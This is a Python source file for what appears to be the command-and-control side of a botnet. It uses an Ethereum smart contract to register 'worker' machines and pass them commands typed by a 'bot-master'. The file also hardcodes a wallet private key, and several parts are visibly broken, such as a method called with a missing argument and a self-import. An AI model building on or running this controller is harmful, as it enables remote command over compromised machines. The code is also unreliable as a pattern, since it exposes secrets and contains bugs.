import yaml 
import json
import time
import sys

from web3 import Web3, HTTPProvider
from threading import Thread
from Commander import CONFIG_FILE, RPC_URL, get_logger

#TODO use environment variables
my_address ="0x7F157E18094fe762a3BAD14Bc428D0F33759dbb6"
pk = "96099e5e584cfcfe02d5c499fdb4181fac2329342270cd2d66568ddd1d247b38"

class Commander:
    #
    #   config_file : must contain an address and ABI
    #   TODO: add chainID to config
    #
    def __init__(self, config_file) -> None:
        self.web3 = Web3(HTTPProvider(RPC_URL))
        self.contract = self.load_contract(config_file)
        self.stopped = False
        self.logger = get_logger(__name__)
    
    #load contract form config
    def load_contract(self, config_file):
        with open(config_file) as f:
            conf = yaml.safe_load(f)
        abi = conf['contract']['abi']
        address = conf['contract']['address']
        contract = self.web3.eth.contract(address=address, abi=abi)
        return contract

    #
    #   start a separate thread to listen for joinRequests 
    #     
    def start(self):
        join_event = self.contract.events.joinRequest.createFilter(fromBlock='latest')
        def log_loop(event_filter, poll_interval, handler):
            while not self.stopped:
                try:
                    for event in event_filter.get_new_entries():
                        handler(self.web3.toJSON(event)) #just pass event ???
                    time.sleep(poll_interval)
                except Exception as e:
                    pass
            self.logger.info('Thread listening for join requests has quit')
        
        worker = Thread(target=log_loop, args=(join_event, 10, self.on_join_request), daemon=True)
        worker.start()

        self.parse_input()
    
    #
    #   add a worker, when a join request is received
    #
    def on_join_request(self, tx):
        req = json.loads(tx)
        worker_key = req["args"]["workerKey"]
        self.logger.info(f'Commander has recieved a join request from a worker with key: {worker_key}')
        txn = self.create_add_worker_txn(worker_key)
        self.sign_and_send(txn)
    

    def create_add_worker_txn(self, worker_key, worker_ip):
        add_worker_txn = self.contract.functions.addWorker(worker_key).buildTransaction(
            {
                "chainId": 4,
                "gasPrice": self.web3.eth.gas_price,
                "from": my_address,
                "nonce": self.web3.eth.getTransactionCount(my_address),
            }
        ) 
        return add_worker_txn

    #
    #   returns an addCommand transaction
    #
    def create_add_cmd_txn(self, cmd, worker_key):
        add_cmd_txn = self.contract.functions.addCommand(worker_key, cmd).buildTransaction(
            {
                "chainId": 4, #TODO: add to config
                "gasPrice": self.web3.eth.gas_price,
                "from": my_address,
                "nonce": self.web3.eth.getTransactionCount(my_address),
            }
        ) 
        return add_cmd_txn 
    
    #
    #   return an add command transaction receipt
    #
    def add_command(self, cmd, worker_key):
        txn = self.create_add_cmd_txn(cmd, worker_key)
        self.logger.info(f'Commander sending command: {cmd} to worker with the key: {worker_key}')
        self.sign_and_send(txn)

    #
    #   signs and send the given transaction
    #
    def sign_and_send(self, txn):
        signed_txn = self.web3.eth.account.sign_transaction(
            txn, private_key=pk
        )
        tx_hash = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction)
        tx_receipt = self.web3.eth.wait_for_transaction_receipt(tx_hash)
        return tx_receipt

    def stop(self):
        self.stopped = True
        self.logger.info('Commander has stopped')

    #TODO
    def generate_worker_instance():
        pass
    
    #
    #   bot-master types;
    #   <command>, to send <command> to every Worker,
    #   <command> -wk <worker_key>, to only send <command> to <worker_key>,
    #   STOP, to exit
    #
    def parse_input(self):
        print("Enter <command>, use -wk <worker key> to specify worker.")
        try:
            while not self.stopped:
                line = sys.stdin.readline()
                if line == 'STOP':
                    self.stop()
                elif line != "":
                    self.handle_input(line)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()
    
    def handle_input(self, line):
        arr = line.split('-wk')
        if len(arr) < 2:
            self.add_command(arr[0], "ALL")
        else:
            self.add_command(arr[0], arr[1])


if __name__ == '__main__':
    commander = Commander(CONFIG_FILE)
    commander.start()